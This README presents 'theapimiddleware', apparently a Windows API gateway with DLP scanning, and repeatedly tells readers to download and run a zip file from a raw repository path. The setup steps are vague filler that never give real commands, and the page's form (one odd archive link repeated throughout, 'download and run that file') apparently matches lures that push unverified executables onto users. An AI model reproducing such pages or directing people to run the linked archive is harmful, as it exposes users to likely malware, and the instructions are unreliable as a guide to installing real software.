# 🔐 theapimiddleware - Secure API Control for Windows

[![Download theapimiddleware](https://img.shields.io/badge/Download%20theapimiddleware-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip)

## 🚀 Getting Started

theapimiddleware is a self-hosted API gateway for Windows. It helps you route API traffic, scan data for sensitive content, and manage access from one admin dashboard.

Use it when you want to:
- place a gateway in front of your APIs
- check outgoing and incoming data for DLP rules
- review activity in a simple dashboard
- keep control on your own machine or server

## 📥 Download

Visit this page to download and set up the app:

[https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip](https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip)

If the page shows a release file, download and run that file. If it shows source files instead of a release file, use the setup steps below to run it on Windows.

## ✅ What You Need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- Internet access
- Enough free disk space for the app and logs
- A web browser such as Edge, Chrome, or Firefox
- Docker Desktop if you plan to run it with containers
- PowerShell if you plan to start it from the command line

For the best result, use a PC with:
- 8 GB RAM or more
- a recent Intel or AMD processor
- at least 2 GB free disk space

## 🧰 What the App Does

theapimiddleware gives you a central place to handle API traffic.

You can use it to:
- forward requests to your internal API
- inspect request and response data
- block data that matches DLP rules
- track usage in an admin dashboard
- keep logs for review
- protect endpoints behind a reverse proxy layer

This setup works well for teams that need a local or private API control layer.

## 🪟 Install on Windows

There are two common ways to run theapimiddleware on Windows.

### Option 1: Run with Docker

If the project includes Docker files, this is the easiest path.

1. Install Docker Desktop for Windows.
2. Open Docker Desktop and wait until it starts.
3. Download or clone the project files from:
   [https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip](https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip)
4. Open the project folder.
5. Open PowerShell in that folder.
6. Run the Docker command shown in the project files.
7. Wait for the containers to start.
8. Open your browser and go to the local address shown in the setup output.

If the app includes a `.env` file, set the app URL, port, and database details before you start it.

### Option 2: Run from the Project Files

If you want to run it without Docker:

1. Download the project files from:
   [https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip](https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip)
2. Extract the files to a folder on your PC.
3. Install the required runtime if the project lists one.
4. Open the folder in PowerShell.
5. Run the install command shown in the project instructions.
6. Start the app with the command shown in the project instructions.
7. Open the dashboard in your browser.

## ⚙️ First-Time Setup

After the app starts, set up the basic values:

- Admin email
- Admin password
- Gateway port
- Backend API target
- DLP scan rules
- Log storage path

Use a strong password for the admin account. Pick a port that is free on your PC.

If the app uses a database, create it before first use. A local database keeps the gateway and dashboard data on your machine.

## 🌐 Open the Dashboard

Once the app is running, open the dashboard in your browser.

You may see pages for:
- gateway status
- request logs
- blocked requests
- DLP events
- admin settings
- route rules
- user access

Use the dashboard to check if traffic flows through the gateway as expected.

## 🔎 How DLP Scanning Works

DLP means data loss prevention.

In this app, DLP scanning looks for data you do not want to send through an API. This can include:
- card numbers
- email addresses
- phone numbers
- national ID values
- secret keys
- tokens
- private customer data

When a rule matches, the app can:
- log the event
- block the request
- mask the data
- send the request to review

This helps you keep control over data that leaves your network.

## 🛡️ Basic Use

After setup, you can use the gateway in a few simple ways:

1. Add the API route you want to protect.
2. Point your app or service to the gateway instead of the backend API.
3. Turn on the DLP rules you need.
4. Test a request from your app or browser.
5. Check the dashboard for logs and scan results.
6. Adjust the rules if traffic gets blocked by mistake.

If a request does not work, check:
- the backend API URL
- the gateway port
- the admin settings
- the scan rules
- the logs

## 📁 Common Folder Items

You may see these files and folders in the project:

- `docker-compose.yml` for Docker setup
- `.env` for app settings
- `public` for web files
- `storage` for logs and app data
- `routes` for request paths
- `app` for core app code
- `config` for settings

These names help you find the main parts of the project.

## 🔧 Useful Settings

These settings are useful for most Windows setups:

- **Gateway port:** Use a free port such as 8080 or 8000
- **Dashboard URL:** Use localhost for local use
- **Log level:** Keep it at info unless you need more detail
- **Scan mode:** Start with alert mode, then switch to block mode
- **Backend timeout:** Use a short timeout for faster error checks

If you run this on a shared PC, store logs in a private folder.

## 🧪 Test Your Setup

Use a simple test after install:

1. Open the dashboard.
2. Send one test API request through the gateway.
3. Check that the request reaches the backend.
4. Add one DLP rule with a known test value.
5. Send the same request again.
6. Confirm that the app logs or blocks the request.

This gives you a quick check that routing and scanning both work.

## ❓ Common Issues

### The dashboard does not open
- Check that the app is running
- Make sure the port is not used by another app
- Try `http://localhost:<port>` in your browser

### Docker does not start
- Open Docker Desktop and wait until it is ready
- Restart Docker Desktop
- Make sure virtualization is enabled in BIOS

### Requests do not reach the backend
- Check the backend URL
- Check the route rule
- Check the firewall
- Review the logs

### DLP rules block too much
- Switch to alert mode
- Narrow the rule pattern
- Test with one rule at a time

## 🧭 Suggested Windows Flow

If you want the simplest path, use this order:

1. Open the GitHub page.
2. Download the project files.
3. Install Docker Desktop if needed.
4. Start the app.
5. Open the dashboard in a browser.
6. Set your gateway and DLP rules.
7. Test one API request.
8. Review logs and adjust settings

## 📌 Project Focus

theapimiddleware is built for:
- API gateway control
- reverse proxy routing
- self-hosted security
- DLP scanning
- admin dashboard use
- local or private deployment

It fits use cases where you want to keep API control on your own machine instead of using a hosted service.